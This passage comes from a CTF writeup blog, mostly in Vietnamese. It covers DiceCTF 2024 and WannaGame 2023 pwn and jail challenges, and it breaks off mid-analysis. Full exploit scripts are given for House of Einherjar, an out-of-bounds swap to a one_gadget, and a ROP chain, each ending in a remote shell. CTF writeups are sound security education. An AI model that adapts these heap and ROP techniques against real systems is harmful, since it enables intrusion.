\u0026gt; thoạt nhìn qua 3 chức năng do_str, do_tok, do_del thì không thấy bug gì cả. chúng ta có thể allocate qua malloc, strtok, free.\nsolution void do_tok(void) { printf(\u0026#34;idx? \u0026#34;); unsigned long idx = get_num(); if (idx \u0026gt;= arr_size) { puts(\u0026#34;too big!\u0026#34;); return; } char *str = strs[idx]; if (str == null) { puts(\u0026#34;empty!\u0026#34;); return; } printf(\u0026#34;delim? \u0026#34;); char delim[2]; read(stdin_fileno, delim, sizeof(delim)); delim[1] = \u0026#39;\\0\u0026#39;; for (char *tok = strtok(str, delim); tok != null; tok = strtok(null, delim)) { puts(tok); } } hàm strtok() chia 1 string thành chuỗi null hoặc là 1 chuỗi token. nếu tìm thấy delimiter byte đã được chỉ định, nó sẽ được ghi đè bởi null byte để kết thúc chuỗi.\nthe strtok() function breaks a string into a sequence of zero or more nonempty tokens. on the first call to strtok(), the string to be parsed should be specified in str. in each subsequent call that should parse the same string, str must be null.\nở hàm do_str(), khi cấp phát và nhập nội dung thì nó sẽ đọc chính xác số kí tự theo size đã được chỉ định và không kết thúc chuỗi bằng null byte. do đó, ta có thể lấp đầy heap.\nbây giờ ta gọi hàm do_tok() và chỉ định delimiter byte là byte đầu tiên của trường size của chunk kế tiếp, ta sẽ trigger được null byte overflow.\nđến đây, mình khá là tà đạo nên sẽ sử dụng kĩ thuật house of einherjar để ghi đè __free_hook và get shell.\nsolve script from pwn import * if args.local: io=process(\u0026#39;./chall_patched\u0026#39;) if args.gdb: cmd=\u0026#34;\u0026#34;\u0026#34; init-pwndbg \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) else: io=remote(\u0026#39;mc.ax\u0026#39;, 32526) #io=remote(\u0026#39;0\u0026#39;, 1337) libc=elf(\u0026#39;./libc-2.27.so\u0026#39;) elf=elf(\u0026#39;./chall_patched\u0026#39;) def str_(size, ll): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size? \u0026#39;, str(size).encode()) if size: sleep(0.1) io.send(ll) def tok(idx, delim): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;idx? \u0026#39;, str(idx).encode()) io.sendafter(b\u0026#39;delim? \u0026#39;, delim) def del_(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) io.sendafter(b\u0026#39;idx? \u0026#39;, str(idx).encode()) def exit_(): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) for i in range(2): str_(0, b\u0026#39;aa\u0026#39;) del_(0) del_(1) str_(0, b\u0026#39;a\u0026#39;) tok(0, b\u0026#39;\\0\u0026#39;) heap = u64(io.recv(6)+b\u0026#39;\\0\\0\u0026#39;) - 0x260 del_(0) print(hex(heap)) str_(0x4f8, b\u0026#39;a\u0026#39;) str_(0x20, b\u0026#39;a\u0026#39;) del_(0) str_(0x4f8, b\u0026#39;\\x60\u0026#39;) tok(0, b\u0026#39;\\0\u0026#39;) libc.address = u64(io.recv(6)+b\u0026#39;\\0\\0\u0026#39;) - 0x3ebc60 print(hex(libc.address)) # del_(0) str_(0x38, p64(0)+p64(0x60)+p64(heap+0x7d0)*2) # 2 str_(0x28, b\u0026#39;a\u0026#39;*0x28) # 3 str_(0xf8, b\u0026#39;b\u0026#39;) # 4 tok(3, b\u0026#39;\\x01\u0026#39;) del_(3) str_(0x28, b\u0026#39;a\u0026#39;*0x20+p64(0x60)) # 3 for i in range(7): str_(0xf8, str(i).encode()) # 5 -\u0026gt; 12 str_(0x68, b\u0026#39;c\u0026#39;) # 13 for i in range(7): del_(i+5) del_(4) str_(0x158, b\u0026#39;test\u0026#39;) del_(4) del_(3) str_(0x158, b\u0026#39;test\u0026#39;*10+p64(0x30)+p64(libc.sym.__free_hook)) str_(0x28, b\u0026#39;a\u0026#39;) str_(0x28, p64(libc.sym.system)) str_(0x100, b\u0026#39;/bin/sh\u0026#39;) del_(6) io.interactive() pwn - boogie-woogie source code overview #include \u0026lt;stddef.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; // generate art.h with echo \u0026#34;const unsigned char __art[] = {$((ascii-image-converter ./aoi-todo.webp --color --dither --braille --width 80; echo -ne \u0026#34;\\x00\u0026#34;) | xxd -i)};\u0026#34; \u0026gt; art.h #include \u0026#34;art.h\u0026#34; char data[] = {\u0026#34;listen closely, cursed spirit. there is no way you do not know this. an arm is\\nmerely a decoration. the act of applause is an acclamation of the soul!\u0026#34;}; void clap(size_t a, size_t b) { data[a] ^= data[b]; data[b] ^= data[a]; data[a] ^= data[b]; } // gcc main.c -o boogie-woogie int main() { // set line buffering. comment this to let libc decide when to buffer (based on pty) // setvbuf(dlsym(null, \u0026#34;stdout\u0026#34;), null, _iolbf, 0); printf(\u0026#34;%s\\n\u0026#34;, __art); printf(\u0026#34;\\x1b[0;33meven this cursed spirit uses black flash. the one who is now being left behind\\nis me. you’ve gotten strong, brother. are you gonna just sit still, \\x1b[4;33maoi todo\\x1b[0;33m?!\\nare you gonna let your brother feel alone again, \\x1b[4;33maoi todo\\x1b[0;33m?!\\x1b[0m\\n\\n\u0026#34;); while (data[0]) { size_t a, b = 0; printf(\u0026#34;\\n\\x1b[31;49;1;4m%s\\x1b[0m\\n\\n\\n\u0026#34;, data); printf(\u0026#34;the sound of \\x1b[0;33mgion shoja bells\\x1b[0m echoes the impermanence of all things. the color\\nof \\x1b[0;33msala flowers\\x1b[0m reveals the truth that the prosperous must decline. \\x1b[4;33mhowever\\x1b[0m! we\\nare the exception:\\n\u0026#34;); scanf(\u0026#34;%zu %zu\u0026#34;, \u0026amp;a, \u0026amp;b); clap(a, b); } } chương trình nhìn có vẻ đơn giản, nhận 2 số làm input, swap 2 kí tự ở mảng toàn cục data và sẽ in ra mảng đó sau khi swap.\nkhông có đoạn code nào check input của ta nên dễ thấy oob xuất hiện và từ đó có thể swap byte với mọi phân vùng rw* trong binary.\nsolution leak pie __dso_handle ?\nnó được đưa vào tham số thứ 3 của hàm __cxa_atexit và được dùng để xác định dynamic shared objects trong quá trình hủy đối tượng toàn cục (thông thường là ở quá trình kết thúc chương trình)\nint __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle);\nnhìn vào đoạn code dưới đây, khi mà ta thay đổi giá trị của __dso_handle thì không có ý nghĩa trong việc khai thác lắm\nstdlib/cxa_finalize.c\n#include \u0026lt;assert.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026#34;exit.h\u0026#34; #include \u0026lt;register-atfork.h\u0026gt; #include \u0026lt;sysdep.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; /* if d is non-null, call all functions registered with `__cxa_atexit\u0026#39; with the same dso handle. otherwise, if d is null, call all of the registered handlers. */ void __cxa_finalize (void *d) { struct exit_function_list *funcs; __libc_lock_lock (__exit_funcs_lock); restart: for (funcs = __exit_funcs; funcs; funcs = funcs-\u0026gt;next) { struct exit_function *f; for (f = \u0026amp;funcs-\u0026gt;fns[funcs-\u0026gt;idx - 1]; f \u0026gt;= \u0026amp;funcs-\u0026gt;fns[0]; --f) if ((d == null || d == f-\u0026gt;func.cxa.dso_handle) \u0026amp;\u0026amp; f-\u0026gt;flavor == ef_cxa) { const uint64_t check = __new_exitfn_called; void (*cxafn) (void *arg, int status) = f-\u0026gt;func.cxa.fn; void *cxaarg = f-\u0026gt;func.cxa.arg; /* we don\u0026#39;t want to run this cleanup more than once. the itanium c++ abi requires that multiple calls to __cxa_finalize not result in calling termination functions more than once. one potential scenario where that could happen is with a concurrent dlclose and exit, where the running dlclose must at some point release the list lock, an exiting thread may acquire it, and without setting flavor to ef_free, might re-run this destructor which could result in undefined behaviour. therefore we must set flavor to ef_free to avoid calling this destructor again. note that the concurrent exit must also take the dynamic loader lock (for library finalizer processing) and therefore will block while dlclose completes the processing of any in-progress exit functions. lastly, once we release the list lock for the entry marked ef_free, we must not read from that entry again since it may have been reused by the time we take the list lock again. lastly the detection of new registered exit functions is based on a monotonically incrementing counter, and there is an aba if between the unlock to run the exit function and the re-lock after completion the user registers 2^64 exit functions, the implementation will not detect this and continue without executing any more functions. one minor issue remains: a registered exit function that is in progress by a call to dlclose() may not completely finish before the next registered exit function is run. this may, according to some readings of posix violate the requirement that functions run in effective lifo order. this should probably be fixed in a future implementation to ensure the functions do not run in parallel. */ f-\u0026gt;flavor = ef_free; #ifdef ptr_demangle ptr_demangle (cxafn); #endif /* unlock the list while we call a foreign function. */ __libc_lock_unlock (__exit_funcs_lock); cxafn (cxaarg, 0); __libc_lock_lock (__exit_funcs_lock); /* it is possible that that last exit function registered more exit functions. start the loop over. */ if (__glibc_unlikely (check != __new_exitfn_called)) goto restart; } } /* also remove the quick_exit handlers, but do not call them. */ for (funcs = __quick_exit_funcs; funcs; funcs = funcs-\u0026gt;next) { struct exit_function *f; for (f = \u0026amp;funcs-\u0026gt;fns[funcs-\u0026gt;idx - 1]; f \u0026gt;= \u0026amp;funcs-\u0026gt;fns[0]; --f) if (d == null || d == f-\u0026gt;func.cxa.dso_handle) f-\u0026gt;flavor = ef_free; } /* remove the registered fork handlers. we do not have to unregister anything if the program is going to terminate anyway. */ if (d != null) unregister_atfork (d); __libc_lock_unlock (__exit_funcs_lock); } tuy nhiên, có 1 điều chú ý ở đây là nó trỏ đến chính địa chỉ của nó trong phân vùng .bss, từ đây ta có thể dễ dàng leak được pie.\npwndbg\u0026gt; tel \u0026amp;__dso_handle 00:0000│ 0x555555563008 (__dso_handle) ◂— 0x555555563008 leak heap ╭─    ~/ctf/pwnable/2024/dicectf/boogie-woogie   ✔  w1n_gl0ry@phis1ng ─╮ ╰─ cat /proc/155341/maps ─╯ 56330ee12000-56330ee13000 r--p 00000000 08:02 1344433 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched 56330ee13000-56330ee14000 r-xp 00001000 08:02 1344433 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched 56330ee14000-56330ee20000 r--p 00002000 08:02 1344433 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched 56330ee20000-56330ee21000 r--p 0000d000 08:02 1344433 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched 56330ee21000-56330ee23000 rw-p 0000e000 08:02 1344433 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched 5633107ab000-5633107cc000 rw-p 00000000 00:00 0 [heap] 7f835b000000-7f835b028000 r--p 00000000 08:02 1344431 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/libc.so.6 7f835b028000-7f835b1bd000 r-xp 00028000 08:02 1344431 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/libc.so.6 7f835b1bd000-7f835b215000 r--p 001bd000 08:02 1344431 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/libc.so.6 7f835b215000-7f835b216000 ---p 00215000 08:02 1344431 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/libc.so.6 7f835b216000-7f835b21a000 r--p 00215000 08:02 1344431 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/libc.so.6 7f835b21a000-7f835b21c000 rw-p 00219000 08:02 1344431 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/libc.so.6 7f835b21c000-7f835b229000 rw-p 00000000 00:00 0 7f835b2ce000-7f835b2d3000 rw-p 00000000 00:00 0 7f835b2d3000-7f835b2d5000 r--p 00000000 08:02 1344432 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/ld-2.35.so 7f835b2d5000-7f835b2ff000 r-xp 00002000 08:02 1344432 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/ld-2.35.so 7f835b2ff000-7f835b30a000 r--p 0002c000 08:02 1344432 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/ld-2.35.so 7f835b30b000-7f835b30d000 r--p 00037000 08:02 1344432 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/ld-2.35.so 7f835b30d000-7f835b30f000 rw-p 00039000 08:02 1344432 /home/w1n_gl0ry/ctf/pwnable/2024/dicectf/boogie-woogie/ld-2.35.so 7ffc7b917000-7ffc7b938000 rw-p 00000000 00:00 0 [stack] 7ffc7b947000-7ffc7b94b000 r--p 00000000 00:00 0 [vvar] 7ffc7b94b000-7ffc7b94d000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] nhận thấy offset giữa vùng data và vùng heap bị ảnh hưởng bởi aslr nên không cố định.\nsource/arch/x86/kernel/process.c\nunsigned long arch_randomize_brk(struct mm_struct *mm) { return randomize_page(mm-\u0026gt;brk, 0x02000000); } nhìn vào source trên, địa chỉ của heap sẽ bắt đầu từ 0 -\u0026gt; 0x02000000 (dài khoảng 8192 pages) tính từ địa chỉ kết thúc của program (bằng 0 nếu binary không có cơ chế aslr), mà địa chỉ heap trải dài khoảng 33 pages (dài 0x21000). do đó ta có thể brute tương đương 1/249 lần (33/8192) để có thể xác định được 1 địa chỉ hợp lệ ở phân vùng heap, từ đó ta có thể xác định được địa chỉ heap base bằng cách kiểm tra byte cuối của top chunk hoặc tcache_perthread_struct size field.\nleak libc leak libc từ 1 chunk được đưa vào unsorted bin nhờ aar là điều mà ta thường hay làm, nhưng ở bài này thì không đơn giản như vậy. ta có thể allocate 1 chunk lớn thông qua hàm scanf nhưng sau khi kết thúc hàm scanf nó sẽ free và consolidate với top-chunk nên ta sẽ không thể leak được.\nta có thể ghi đè size của top-chunk:\nkhi mà size của top-chunk không đủ lớn để phân bổ, nó sẽ gọi đến sysmalloc để phân bổ vùng heap mới và sẽ gọi đến _int_free để free top-chunk cũ nếu thõa mãn các điều kiện dưới đây assert ((old_top == initial_top (av) \u0026amp;\u0026amp; old_size == 0) || ((unsigned long) (old_size) \u0026gt;= minsize \u0026amp;\u0026amp; prev_inuse (old_top) \u0026amp;\u0026amp; ((unsigned long) old_end \u0026amp; (pagesize - 1)) == 0)); assert ((unsigned long) (old_size) \u0026lt; (unsigned long) (nb + minsize)); vậy nếu chỉnh sửa byte thứ 3 của top-chunk thành null-byte rồi cấp phát 1 chunk cực lớn thông qua hàm scanf là chúng ta đã có thể đưa top-chunk vào unsorted-bin. pwndbg\u0026gt; bins tcachebins empty fastbins empty unsortedbin all: 0x562a15d01ab0 —▸ 0x7f55a46a1ce0 ◂— 0x562a15d01ab0 smallbins empty largebins empty get shell bây giờ ta đã có aaw với địa chỉ libc vừa được leak, đơn giản ta sẽ leak stack thông qua __libc_envrion rồi ghi đè return address về one_gadget .\nsolve script from pwn import * import os libc = elf(\u0026#34;./libc.so.6\u0026#34;) elf = context.binary = elf(\u0026#34;./boogie-woogie_patched\u0026#34;) # context.log_level = \u0026#39;debug\u0026#39; def connect(): if args.local: return process(\u0026#39;./boogie-woogie_patched\u0026#39;) elif args.docker: return remote(\u0026#39;0\u0026#39;, 1337) def clap_str(num1, num2): io.sendline(num1.encode() + b\u0026#39; \u0026#39; + num2.encode()) def clap(v1,v2): io.sendline((str(v1)+\u0026#39; \u0026#39;+str(v2)).encode()) def aar(addr): for i in range(8): clap(addr+i, 1+i) for _ in range(8): io.readuntil(b\u0026#34;exception:\u0026#34;) io.recvuntil(b\u0026#34;4m\u0026#34;) io.recvuntil(b\u0026#34;l\u0026#34;) ptr = u64(io.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;)) for i in range(8): io.sendline(f\u0026#34;{addr+i} {1+i}\u0026#34;.encode()) for _ in range(8): io.recvuntil(b\u0026#34;exception:\u0026#34;) return ptr def aaw(addr1, addr2, len): for i in range(len): clap(addr1+i-elf.sym[\u0026#39;data\u0026#39;], addr2+i-elf.sym[\u0026#39;data\u0026#39;]) def brute_heap_offset(): idx = 0 with log.progress(\u0026#39;bruting\u0026#39;) as p: while true: try: idx += 1 p.status(\u0026#34;attempt %i\u0026#34;, idx) io = connect() io.recvuntil(b\u0026#34;exception\u0026#34;) trial_heap_offset = 0x1995fe0 io.sendline(f\u0026#34;1 {trial_heap_offset}\u0026#34;.encode()) io.recvuntil(b\u0026#34;exception\u0026#34;) io.sendline(f\u0026#34;1 {trial_heap_offset}\u0026#34;.encode()) p.success() return (io, trial_heap_offset \u0026gt;\u0026gt; 12 \u0026lt;\u0026lt; 12) except eoferror: with context.local(log_level=\u0026#39;error\u0026#39;): io.close() io, heap_page = brute_heap_offset() __dso_handle = aar(-24) elf.address = __dso_handle - elf.symbols[\u0026#39;__dso_handle\u0026#39;] log.info(\u0026#39;pie \u0026#39; + hex(elf.address)) tcache_perthread_struct = heap_page + 8 - 0x20 io.recvuntil(b\u0026#34;exception:\u0026#34;) while true: io.sendline(f\u0026#34;1 {tcache_perthread_struct}\u0026#34;.encode()) io.recvuntil(b\u0026#34;l\u0026#34;) if io.recv(1) == b\u0026#39;\\x91\u0026#39;: io.recvuntil(b\u0026#34;exception:\u0026#34;) break io.recvuntil(b\u0026#34;exception:\u0026#34;) tcache_perthread_struct -= 0x1000 heap = tcache_perthread_struct - 0x8 top_chunk = heap + 0x0ab8 log.info(\u0026#39;heap \u0026#39; + hex(heap)) log.info(\u0026#39;top_chunk \u0026#39; + hex(top_chunk)) io.sendline(f\u0026#34;-3 {top_chunk+2}\u0026#34;.encode()) io.sendline(b\u0026#34;-1 -\u0026#34;+b\u0026#34;1\u0026#34;*0x800) # cmd = \u0026#34;\u0026#34;\u0026#34; # init-pwndbg # b* main+199 # \u0026#34;\u0026#34;\u0026#34; # gdb.attach(io, cmd) libc.address = aar(top_chunk+8) - 0x21ace0 io.sendline(f\u0026#34;1 {top_chunk+8+6}\u0026#34;.encode()) log.info(\u0026#39;libc \u0026#39; + hex(libc.address)) og_offset = [0x50a47, 0xebc81, 0xebc88, 0xebc85] stack = aar(libc.sym.__environ - elf.sym[\u0026#39;data\u0026#39;]) - 0x21ace0 ret = stack - 0x120 rbp = ret-8 log.info(\u0026#39;stack \u0026#39; + hex(stack)) log.info(\u0026#39;ret \u0026#39; + hex(ret)) with open(\u0026#34;libc_bss\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = bytearray(f.read()) ## overwrite rbp with stack address in libc_environ aaw(rbp, libc.sym.__environ, 8) def get_byte(addr, nth): return ((addr \u0026gt;\u0026gt; 8*nth) \u0026amp; 0xff).encode() og = libc.address + og_offset[2] aaw(libc.bss()+data.find(get_byte(og, 0)), ret, 1) aaw(libc.bss()+data.find(get_byte(og, 1)), ret+1, 1) aaw(libc.bss()+data.find(get_byte(og, 2)), ret+2, 1) clap(0, 0) # win io.interactive() ở bài này, vì có write primitive ở libc 2.35 khá là mạnh nên mọi người có thể làm nhiều cách khác nhau, mọi người có thể tham khảo ở bài viết này\nmisc - zshfuck source code overview #!/bin/zsh print -n -p \u0026#34;%f{green}specify your charset: %f\u0026#34; read -r charset # get uniq characters in charset charset=(\u0026#34;${(us..)charset}\u0026#34;) banned=(\u0026#39;*\u0026#39; \u0026#39;?\u0026#39; \u0026#39;`\u0026#39;) if [[ ${#charset} -gt 6 || ${#charset:|banned} -ne ${#charset} ]]; then print -p \u0026#34;\\n%f{red}that\u0026#39;s too easy. sorry.%f\\n\u0026#34; exit 1 fi print -p \u0026#34;\\n%f{green}ok! got $charset.%f\u0026#34; charset+=($\u0026#39;\\n\u0026#39;) # start jail via coproc coproc zsh -s exec 3\u0026gt;\u0026amp;p 4\u0026lt;\u0026amp;p # read chars from fd 4 (jail stdout), print to stdout while ifs= read -u4 -r -k1 char; do print -u1 -n -- \u0026#34;$char\u0026#34; done \u0026amp; # read chars from stdin, send to jail stdin if valid while ifs= read -u0 -r -k1 char; do if [[ ! ${#char:|charset} -eq 0 ]]; then print -p \u0026#34;\\n%f{red}nope.%f\\n\u0026#34; exit 1 fi # send to fd 3 (jail stdin) print -u3 -n -- \u0026#34;$char\u0026#34; done solution đọc sơ qua thì dường như đây là 1 bài escape jail. khi mà ta được define 6 kí tự (ngoài *, ?, `) và sẽ thực thi được command chỉ sử dụng những kí tự mà ta đã define. vì absolute path của binary getflag khá là dài nên mình sẽ dùng command find .\n╭─    ~/ctf/pwnable/2024/dicectf/boogie-woogie   ✔  w1n_gl0ry@phis1ng ─╮ ╰─ nc mc.ax 31774 ─╯ specify your charset: find . ok! got f i n d .. find . . ./y0u ./y0u/w1ll ./y0u/w1ll/n3v3r_g3t ./y0u/w1ll/n3v3r_g3t/th1s ./y0u/w1ll/n3v3r_g3t/th1s/getflag ./run bây giờ, để thực thi được ./y0u/w1ll/n3v3r_g3t/th1s/getflag với số kí tự ít ỏi như vậy khá là khoai. sau 1 hồi, mình tìm thấy tài liệu liên quan đến zsh và chỉ cần define đúng 5 kí tự ./[!] .\nfinal payload reference https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c\nhttps://wiki.osdev.org/c%2b%2b#gcc\nhttps://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c\nhttps://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c\nhttps://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#l2547\nhttps://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#l4420\nhttps://zsh.sourceforge.io/doc/release/expansion.html#glob-operators\n","title":"DICE-CTF 2024 Writeups"},{"date":"2023-12-12","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/0ctf-tctf/","summary":"0CTF/TCTF 2023 Writeups","tags":["ctf","pwn","write-up"],"text":"under maintenance\n","title":"0CTF/TCTF 2023 Writeups"},{"date":"2023-12-04","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/wc-2023/","summary":"WannaGame ChampionShip 2023 Writeups","tags":["ctf","pwn"],"text":"introduction this past weekend, i played the wannagame championship ctf with my team 1337% yogurt and we finished in the top 8 global and top 2 in my university. through this, i have managed to solve 2/2 pwn challenge winner_of_all_time and serendipity.\n1. winner of all time overview analysis __int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax __int64 v4; // rdi int v5; // ebx __int64 v7[21]; // [rsp+0h] [rbp-b0h] v3 = time(0ll); v4 = v3; srand(v3); magic = rand() % 123456789; set_up(v4, a2); banner(); puts(\u0026#34;what time do you want to be back?\u0026#34;); while ( 1 ) { printf(\u0026#34;timeline number [%d]: \u0026#34;, (unsigned int)idc); v5 = idc; v7[v5] = get_int(); if ( v7[idc] \u0026gt;= 123456790 ) { puts(\u0026#34;tva: you commit the crime of time!!!\u0026#34;); exit(0); } if ( v7[idc] == magic ) break; ++idc; } puts(\u0026#34;welcome to sanctuary of time\u0026#34;); return 0ll; } the v7 array has only 21 members, but the while loop doesn\u0026rsquo;t break if the idx variable exceeds 21. this means we can easily create a rop chain and use the predictable \u0026lsquo;magic\u0026rsquo; to break out of the while loop.\nimport ctypes libc = ctypes.cdll.loadlibrary(\u0026#39;/path/to/dll\u0026#39;) libc.srand(libc.time(0)) i use this trick to bypass the check for the magic value.\nif ( v7[idc] \u0026gt;= 123456790 ) { puts(\u0026#34;tva: you commit the crime of time!!!\u0026#34;); exit(0); } due to this check, it\u0026rsquo;s not easy to create a normal rop chain with the large address in libc. so, i managed to leak libc and use scanf(\u0026quot;%lld\u0026quot;, \u0026lt;got_addr\u0026gt;) to get shell!!!\nexploit script solve.py\nfrom pwn import * from ctypes import* if args.local: io=process(\u0026#39;./winner_of_all_time\u0026#39;) if args.gdb: cmd=\u0026#34;\u0026#34;\u0026#34; init-pwndbg b* 0x0000000000401589 \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) else: io=remote(\u0026#39;157.245.147.89\u0026#39;, 25174) libc=elf(\u0026#39;./libc.so.6\u0026#39;) elf=context.binary=elf(\u0026#39;./winner_of_all_time\u0026#39;) glibc = cdll.loadlibrary(\u0026#39;./libc.so.6\u0026#39;) pop_rdi=0x0000000000401589 pop_rsi_r15=0x0000000000401596 ret=0x000000000040101a pop_rbp_ret=0x000000000040133e leave_ret=0x00000000004013ac glibc.srand(glibc.time(none)) magic = glibc.rand() % 123456789 print(magic) for i in range(22): io.sendline(str(10).encode()) rbp=0x404b00 io.sendline(str(rbp).encode()) add_nop_ret=0x000000000040127c mov_rbx=0x00000000004013a8 scanf=0x404060 d=0x000000000040270f pl=p64(pop_rdi) pl+=p64(elf.got.puts) pl+=p64(elf.sym.puts) pl+=p64(ret) pl+=p64(pop_rdi) pl+=p64(d) pl+=p64(pop_rsi_r15) pl+=p64(0x404f00) pl+=p64(0) pl+=p64(0x000000000401180) pl+=p64(ret) pl+=p64(pop_rdi) pl+=p64(d) pl+=p64(pop_rsi_r15) pl+=p64(0x404018) pl+=p64(0) pl+=p64(ret) pl+=p64(0x000000000401180) pl+=p64(pop_rdi) pl+=p64(0x404f00) pl+=p64(ret) pl+=p64(elf.sym.puts) for i in range(0, len(pl), 8): io.sendline(str(u64(pl[i:i+8].ljust(8, b\u0026#39;\\0\u0026#39;))).encode()) pause() io.sendline(str(magic).encode()) io.recvuntil(b\u0026#39; welcome to sanctuary of time\u0026#39;) io.recvline() libc.address=u64(io.recv(6).ljust(8, b\u0026#39;\\0\u0026#39;)) - libc.sym.puts print(hex(libc.address)) og=libc.address+0x1052fa pause() io.sendline(str(u64(b\u0026#39;/bin//sh\\0\u0026#39;)).encode()) pause() io.sendline(str(libc.sym.system).encode()) io.interactive() 2. serendipity overview hmm, it\u0026rsquo;s a 64 bits elf file and has full protect, sound good to play with it.\nanalysis void __fastcall __noreturn main(int a1, char **a2, char **a3) { unsigned int i; // [rsp+4h] [rbp-ech] int v4; // [rsp+8h] [rbp-e8h] int j; // [rsp+ch] [rbp-e4h] pthread_t newthread; // [rsp+10h] [rbp-e0h] byref struct sockaddr *addr; // [rsp+18h] [rbp-d8h] void *v8; // [rsp+20h] [rbp-d0h] fd_set *p_readfds; // [rsp+28h] [rbp-c8h] void *buf; // [rsp+30h] [rbp-c0h] ssize_t v11; // [rsp+38h] [rbp-b8h] struct timeval timeout; // [rsp+40h] [rbp-b0h] byref struct sockaddr s; // [rsp+50h] [rbp-a0h] byref fd_set readfds; // [rsp+60h] [rbp-90h] byref unsigned __int64 v15; // [rsp+e8h] [rbp-8h] v15 = __readfsqword(0x28u); pipe(p0); pipe(p1); pipe(p2); pipe(p3); if ( pthread_mutex_init(\u0026amp;mutex, 0ll) || pthread_mutex_init(\u0026amp;mutex2, 0ll) ) error(\u0026#34;pthread_mutex_init\u0026#34;); pthread_create(\u0026amp;newthread, 0ll, session, 0ll); fd = socket(2, 2, 0); if ( fd == -1 ) error(\u0026#34;socket\u0026#34;); memset(\u0026amp;s, 0, sizeof(s)); s.sa_family = 2; *(_word *)s.sa_data = htons(0x26fdu); *(_dword *)\u0026amp;s.sa_data[2] = 0; if ( bind(fd, \u0026amp;s, 0x10u) == -1 ) error(\u0026#34;bind\u0026#34;); addr = (struct sockaddr *)malloc(0x214ull); v8 = malloc(0x100cull); while ( 1 ) { do { p_readfds = \u0026amp;readfds; for ( i = 0; i \u0026lt;= 0xf; ++i ) p_readfds-\u0026gt;fds_bits[i] = 0ll; readfds.fds_bits[fd / 64] |= 1ll \u0026lt;\u0026lt; (fd \u0026amp; 0x3f); timeout.tv_sec = 1ll; timeout.tv_usec = 0ll; if ( select(fd + 1, \u0026amp;readfds, 0ll, 0ll, \u0026amp;timeout) == -1 ) error(\u0026#34;select\u0026#34;); } while ( (readfds.fds_bits[fd / 64] \u0026amp; (1ll \u0026lt;\u0026lt; (fd \u0026amp; 0x3f))) == 0 ); buf = calloc(1ull, 0x1000ull); memset(addr, 0, 0x214ull); memset(v8, 0, 0x100cull); *(_dword *)\u0026amp;addr[1].sa_family = 16; v11 = recvfrom(fd, buf, 0x1000ull, 0, addr, (socklen_t *)\u0026amp;addr[1].sa_family); if ( v11 == -1 ) error(\u0026#34;recvfrom\u0026#34;); v4 = 0; for ( j = 0; ; ++j ) { if ( j \u0026gt; 3 ) goto label_22; if ( *(_qword *)buf == *((_qword *)\u0026amp;thread_id + 2 * j) ) break; } write(p0[2 * j + 1], buf, 0x1000ull); v4 = 1; label_22: if ( !v4 \u0026amp;\u0026amp; !(unsigned int)check_data(addr, v8, buf) ) use_opcode(addr, v8); } first, the server creates a connection using the udp method that allows users to send packets to\nvoid __fastcall __noreturn session(void *a1) { int i; // [rsp+4h] [rbp-ch] time_t v2; // [rsp+8h] [rbp-8h] while ( 1 ) { pthread_mutex_lock(\u0026amp;mutex); v2 = time(0ll); for ( i = 0; i \u0026lt;= 3; ++i ) { if ( *((_qword *)\u0026amp;unk_6100 + 2 * i) ) { if ( v2 \u0026gt;= qword_6108[2 * i] ) { *((_qword *)\u0026amp;unk_6100 + 2 * i) = 0ll; qword_6108[2 * i] = 0ll; printf(\u0026#34;session %d cleaned\\n\u0026#34;, (unsigned int)i); } } } pthread_mutex_unlock(\u0026amp;mutex); sleep(1u); } } it creates 4 pipes, use pthread to create a maximum of 4 threads for connection, reading, and writing.\nselect(fd + 1, \u0026amp;readfds, 0ll, 0ll, \u0026amp;timeout) == -1 it creates a udp connection and uses the select function to handle multiple file descriptors. the program waits until one or more of the file descriptors become \u0026ldquo;ready\u0026rdquo;.\nto send and receive data to users, sendto() and recvfrom() functions are used.\nv11 = recvfrom(fd, buf, 